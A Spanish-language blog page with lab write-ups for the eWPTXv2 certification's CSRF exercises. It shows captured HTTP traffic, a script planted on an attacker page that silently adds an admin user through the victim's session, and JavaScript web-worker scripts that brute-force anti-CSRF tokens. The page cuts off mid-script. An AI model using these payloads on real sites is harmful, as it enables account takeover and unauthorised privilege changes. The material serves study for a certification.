<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>eWPTXV2 Blog de la certificación | Este Blog se centra en la resolución y explotación de cada uno de los ataques que la certificación eWPTXV2 explica en sus laboratorios</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="eWPTXV2 Blog de la certificación" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Este Blog se centra en la resolución y explotación de cada uno de los ataques que la certificación eWPTXV2 explica en sus laboratorios" />
<meta property="og:description" content="Este Blog se centra en la resolución y explotación de cada uno de los ataques que la certificación eWPTXV2 explica en sus laboratorios" />
<link rel="canonical" href="http://localhost:4000/section2.html" />
<meta property="og:url" content="http://localhost:4000/section2.html" />
<meta property="og:site_name" content="eWPTXV2 Blog de la certificación" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="eWPTXV2 Blog de la certificación" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Este Blog se centra en la resolución y explotación de cada uno de los ataques que la certificación eWPTXV2 explica en sus laboratorios","headline":"eWPTXV2 Blog de la certificación","url":"http://localhost:4000/section2.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>eWPTXV2 Blog de la certificación</h1>
        </a>
        <h2>Este Blog se centra en la resolución y explotación de cada uno de los ataques que la certificación eWPTXV2 explica en sus laboratorios</h2>

        <section id="downloads">
          
            <a href="" class="btn">Download as .zip</a>
            <a href="" class="btn">Download as .tar.gz</a>
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="xsrf">XSRF</h1>

<h2 id="teoría">Teoría</h2>

<h2 id="laboratorios">Laboratorios</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Description

You are a soft-administrator of the Pawn Own Shop! and have decided to add your friend Malice to the administrator list.
However, you cannot do this because only Mrs Gallegos can do it.

So you have to find a way to add you friend:
Data 	Value
name 	Malice
surname 	Smith
email 	malice@hacker.site
role 	ADMIN



FYI, each level in Pawn Own Shop! is vulnerbale to CrossSite Request Forgery. Here are some other useful information:

To study the web application here is your login: username: Padawan
password: TheLittlePadawan



Note: Mrs Gallegos is always visiting your site: hacker.site.
If you don't remind, the IP address of your box is: 10.100.13.33 and your SSH login is:

username: r00t
password: Don't worry be happy


Enjoy!! 
</code></pre></div></div>

<h3 id="lab-csrf-1">Lab CSRF 1</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CSRF 1 	This level is just a warm-up to become familiar with the application 	WARM-UP 	Simple warm-up
</code></pre></div></div>

<p>core.js:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">AddUser</span><span class="p">()</span> <span class="p">{</span>

	<span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
		<span class="dl">"</span><span class="s2">name</span><span class="dl">"</span> <span class="p">:</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">firstname</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">,</span>
		<span class="dl">"</span><span class="s2">surname</span><span class="dl">"</span> <span class="p">:</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">surname</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">,</span>
		<span class="dl">"</span><span class="s2">email</span><span class="dl">"</span> <span class="p">:</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">email</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">,</span>
		<span class="dl">"</span><span class="s2">role</span><span class="dl">"</span> <span class="p">:</span> <span class="p">(</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">r2</span><span class="dl">"</span><span class="p">).</span><span class="nx">checked</span> <span class="p">)</span> <span class="p">?</span> <span class="dl">"</span><span class="s2">ADMIN</span><span class="dl">"</span> <span class="p">:</span>  <span class="dl">"</span><span class="s2">USER</span><span class="dl">"</span><span class="p">,</span> 
		<span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
		<span class="p">};</span>
		
	<span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
		<span class="na">url</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">add_user.php</span><span class="dl">"</span><span class="p">,</span>
		<span class="na">type</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>		
		<span class="na">data</span><span class="p">:</span> <span class="nx">params</span><span class="p">,</span> 
		<span class="na">success</span> <span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
			<span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#addResult</span><span class="dl">'</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="dl">""</span><span class="p">);</span>
			<span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#addResult</span><span class="dl">'</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
			
			<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#addResult</span><span class="dl">"</span><span class="p">).</span><span class="nf">removeClass</span><span class="p">(</span> <span class="dl">"</span><span class="s2">alert-danger </span><span class="dl">"</span> <span class="p">);</span>								
			<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#addResult</span><span class="dl">"</span><span class="p">).</span><span class="nf">removeClass</span><span class="p">(</span> <span class="dl">"</span><span class="s2">alert-success </span><span class="dl">"</span> <span class="p">);</span>								
			<span class="k">if</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">success</span><span class="dl">'</span><span class="p">){</span>				
				<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#addResult</span><span class="dl">"</span><span class="p">).</span><span class="nf">addClass</span><span class="p">(</span> <span class="dl">"</span><span class="s2">alert-success</span><span class="dl">"</span> <span class="p">);</span>			
				<span class="nb">window</span><span class="p">.</span><span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="nx">location</span><span class="p">.</span><span class="nf">reload</span><span class="p">();},</span> <span class="mi">1000</span><span class="p">);</span>
			
			<span class="p">}</span><span class="k">else</span><span class="p">{</span>				
				<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#addResult</span><span class="dl">"</span><span class="p">).</span><span class="nf">addClass</span><span class="p">(</span> <span class="dl">"</span><span class="s2">alert-danger</span><span class="dl">"</span> <span class="p">);</span>								
			<span class="p">}</span>
			
			<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#addResult</span><span class="dl">"</span><span class="p">).</span><span class="nf">show</span><span class="p">();</span>
			
		<span class="p">},</span>
		<span class="na">error</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span>
			<span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#addResult</span><span class="dl">'</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">An error has occurred server-side :( </span><span class="dl">"</span><span class="p">);</span>
			<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#addResult</span><span class="dl">"</span><span class="p">).</span><span class="nf">show</span><span class="p">();</span>
		<span class="p">},</span>
		<span class="na">dataType</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">json</span><span class="dl">"</span>
	<span class="p">});</span>

<span class="p">};</span>
</code></pre></div></div>
<p>Request al servicio web objetivo:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /add_user.php HTTP/1.1
Host: 1.csrf.labs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 71
Origin: http://1.csrf.labs
Connection: close
Referer: http://1.csrf.labs/users.php
Cookie: PHPSESSID=db9q7oe1nqplig5ib5u9j780l3

name=Malice&amp;surname=Smith&amp;email=malice%40hacker.site&amp;role=ADMIN&amp;submit=
</code></pre></div></div>

<p>Response:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Date: Thu, 02 Jan 2025 05:40:51 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 114
Connection: close
Content-Type: text/html


{"status":"error","message":"I'm sorry Padawan but only Super Administrators can add other administrator users."}
</code></pre></div></div>

<p>Request a hacker site:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
Host: hacker.site
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
</code></pre></div></div>
<p>Response:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Date: Thu, 02 Jan 2025 05:43:25 GMT
Server: Apache/2.4.52 (Debian)
Last-Modified: Wed, 15 Jun 2022 12:47:05 GMT
ETag: "5f-5e17beb180440-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 95
Connection: close
Content-Type: text/html

&lt;html&gt;

&lt;body bgcolor="#000000"&gt;
	&lt;img src="hackerinside.jpg" /&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre></div></div>

<p>Se añade código malicioso al sitio http://hacker.site</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~# cat /var/www/html/index.html 
&lt;html&gt;

&lt;body bgcolor="#000000"&gt;
        &lt;img src="hackerinside.jpg" /&gt;
&lt;/body&gt;


&lt;script type="text/javascript"&gt;
   var url =  "http://1.csrf.labs/add_user.php";
   var params =  "name=Malice&amp;surname=Smith&amp;email=malice%40hacker.site&amp;role=ADMIN&amp;submit=";
   var CSRF = new XMLHttpRequest();
   CSRF.open("POST", url, true);
   CSRF.withCredentials = 'true'; //IMPORTANT MUST!!
   CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
   CSRF.send(params);
&lt;/script&gt;

&lt;/html&gt;

</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data: cookie=BEEFHOOK=CBIIuuV13yc711WsqHHuz2PG7THd4LbGU2IfP3RS4IpSQhTyUYcg5oPoQtOKcavPWmPbHA1Cb1kLY70r
</code></pre></div></div>

<h3 id="lab-csrf-2">Lab CSRF 2</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CSRF 2 	Are you able to exploit a CSRF using an XSS? 	EASY 	There is always an XSS .. 
</code></pre></div></div>

<h3 id="lab-csrf-3">Lab CSRF 3</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CSRF 3 	What if the application implements Anti-CSRF measures? Find a way to make useless the Anti-CSRF token. 	EASY 	Anti-CSRF? It's a joke! 
</code></pre></div></div>

<h3 id="lab-csrf-4">Lab CSRF 4</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CSRF 4 	String Anti-CSRF tokens?! Nah, if you know how to analyze them 	MEDIUM 	Ten Little Indians.. 
</code></pre></div></div>

<h3 id="lab-csrf-5">Lab CSRF 5</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CSRF 5 	Are you still able to bruteforce that tokens? 	ADVANCED 	Worker on the Web or Web Worker?
</code></pre></div></div>

<h3 id="material">Material</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
   <span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">/solutions/jquery-latest.min.js</span><span class="dl">"</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="sr">/head</span><span class="err">&gt;
</span>        <span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>

                <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Anti</span><span class="o">-</span><span class="nx">CSRF</span> <span class="nx">Tokens</span> <span class="nx">to</span> <span class="nx">test</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>                <span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">tokens</span><span class="dl">"</span> <span class="nx">rows</span><span class="o">=</span><span class="dl">"</span><span class="s2">12</span><span class="dl">"</span> <span class="nx">cols</span><span class="o">=</span><span class="dl">"</span><span class="s2">60</span><span class="dl">"</span><span class="o">&gt;</span>
         <span class="mi">1679091</span><span class="nx">c5a880faf6fb5e6087eb1b2dc</span>
         <span class="mi">45</span><span class="nx">c48cce2e2d7fbdea1afc51c7c6ad26</span>
         <span class="mi">8</span><span class="nx">f14e45fceea167a5a36dedd4bea2543</span>
         <span class="nx">a87ff679a2f3e71d9181a67b7542122c</span>
         <span class="nx">c4ca4238a0b923820dcc509a6f75849b</span>
         <span class="nx">c81e728d9d4c2f636f067f89cc14862c</span>
         <span class="nx">c9f0f895fb98ab9159f51fd0297e236d</span>
         <span class="nx">cfcd208495d565ef66e7dff9f98764da</span>
         <span class="nx">d3d9446802a44259755d38e6d163e820</span>
         <span class="nx">e4da3b7fbbce2345d7772b0674a318d5</span>
         <span class="nx">eccbc87e4b5ce2fe28308fd9f2a7baf3</span>
      <span class="o">&lt;</span><span class="sr">/textarea</span><span class="err">&gt;
</span>
      

                <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
                        <span class="kd">function</span> <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">TList</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">TList</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                                        <span class="nx">console</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="dl">"</span><span class="s2">Testing: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
                                        <span class="nc">XHRPost</span><span class="p">(</span><span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
                                <span class="p">}</span>
                        <span class="p">}</span>

                        <span class="kd">function</span> <span class="nf">XHRPost</span><span class="p">(</span><span class="nx">tVal</span><span class="p">)</span> <span class="p">{</span>
                                <span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
                                <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://{LABID}.csrf.labs/add_user.php</span><span class="dl">"</span><span class="p">;</span>

                                <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">tVal</span><span class="p">;</span>

                                <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
                                        <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">Malice</span><span class="dl">"</span><span class="p">,</span>
                                        <span class="dl">"</span><span class="s2">surname</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">Smith</span><span class="dl">"</span><span class="p">,</span>
                                        <span class="dl">"</span><span class="s2">email</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">malice@hacker.site</span><span class="dl">"</span><span class="p">,</span>
                                        <span class="dl">"</span><span class="s2">role</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">ADMIN</span><span class="dl">"</span><span class="p">,</span>
                                        <span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
                                        <span class="dl">"</span><span class="s2">CSRFToken</span><span class="dl">"</span> <span class="p">:</span> <span class="nx">token</span><span class="p">,</span>
                                <span class="p">};</span>
            
             
                                <span class="nx">http</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
                                <span class="nx">http</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">true</span><span class="dl">'</span><span class="p">;</span>
                                <span class="c1">//Send the proper header information along with the request</span>
                                <span class="nx">http</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
                                <span class="nx">http</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                                        <span class="k">if </span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="c1">//We don't care about responses</span>
                                                <span class="c1">//console.warn("Aborted " + token + " with status " + http.readyState);</span>
                                                <span class="c1">//http.abort();</span>
                                        <span class="p">}</span>
                                <span class="p">}</span>

                     <span class="c1">//Serialize the data without using JQuery </span>
                                <span class="nx">queryParams</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">).</span><span class="nf">reduce</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">k</span><span class="p">){</span><span class="nx">a</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">k</span><span class="o">+</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="o">+</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">params</span><span class="p">[</span><span class="nx">k</span><span class="p">]));</span><span class="k">return</span> <span class="nx">a</span><span class="p">},[]).</span><span class="nf">join</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>
                                <span class="nx">http</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">queryParams</span><span class="p">);</span>
                        <span class="p">}</span>



                        <span class="kd">var</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">tokens</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\s</span><span class="sr">+/gm</span><span class="p">,</span> <span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
                        <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nb">Boolean</span><span class="p">);</span> <span class="c1">// Remove empty lines</span>

                        <span class="c1">// Brute Loop</span>
                        <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">tokens</span><span class="p">);</span>

                <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>        <span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span>
</code></pre></div></div>

<p>brute.js:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">self</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>

        <span class="kd">var</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">tokens</span><span class="p">;</span>

        <span class="kd">function</span> <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">TList</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">TList</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">console</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="dl">"</span><span class="s2">Testing: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
                        <span class="nc">XHRPost</span><span class="p">(</span><span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
                <span class="p">}</span>

                <span class="nc">Terminator</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="nf">XHRPost</span><span class="p">(</span><span class="nx">tVal</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
                <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://{LABID}.csrf.labs/add_user.php</span><span class="dl">"</span><span class="p">;</span>

                <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">tVal</span><span class="p">;</span>

                <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
                        <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">Malice</span><span class="dl">"</span><span class="p">,</span>
                        <span class="dl">"</span><span class="s2">surname</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">Smith</span><span class="dl">"</span><span class="p">,</span>
                        <span class="dl">"</span><span class="s2">email</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">malice@hacker.site</span><span class="dl">"</span><span class="p">,</span>
                        <span class="dl">"</span><span class="s2">role</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">ADMIN</span><span class="dl">"</span><span class="p">,</span>
                        <span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
                        <span class="dl">"</span><span class="s2">CSRFToken</span><span class="dl">"</span> <span class="p">:</span> <span class="nx">token</span><span class="p">,</span>
                <span class="p">};</span>
    
     
                <span class="nx">http</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
                <span class="nx">http</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">true</span><span class="dl">'</span><span class="p">;</span>
                <span class="c1">//Send the proper header information along with the request</span>
                <span class="nx">http</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
                <span class="nx">http</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                        <span class="k">if </span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="c1">//We don't care about responses</span>
                                <span class="c1">//console.warn("Aborted " + token + " with status " + http.readyState);</span>
                                <span class="c1">//http.abort();</span>
                        <span class="p">}</span>
                <span class="p">}</span>

         <span class="c1">//Serialize the data without using JQuery </span>
                <span class="nx">queryParams</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">).</span><span class="nf">reduce</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">k</span><span class="p">){</span><span class="nx">a</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">k</span><span class="o">+</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="o">+</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">params</span><span class="p">[</span><span class="nx">k</span><span class="p">]));</span><span class="k">return</span> <span class="nx">a</span><span class="p">},[]).</span><span class="nf">join</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>
                <span class="nx">http</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">queryParams</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="nf">Terminator</span><span class="p">()</span> <span class="p">{</span>
                <span class="nb">self</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span> <span class="dl">"</span><span class="s2">Sir, I've finished... see you later</span><span class="dl">"</span><span class="p">);</span>
                <span class="nb">self</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
                <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// Brute Loop</span>
        <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">tokens</span><span class="p">);</span>


<span class="p">},</span> <span class="kc">false</span><span class="p">);</span>
</code></pre></div></div>

<p>pwnownshop.site.bruter.js</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">self</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">tokens</span><span class="p">;</span>
        <span class="kd">function</span> <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">TList</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">TList</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">console</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="dl">"</span><span class="s2">Testing: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
                        <span class="nc">XHRPost</span><span class="p">(</span><span class="nx">TList</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
                <span class="p">}</span>
                <span class="nc">Terminator</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="kd">function</span> <span class="nf">XHRPost</span><span class="p">(</span><span class="nx">tVal</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
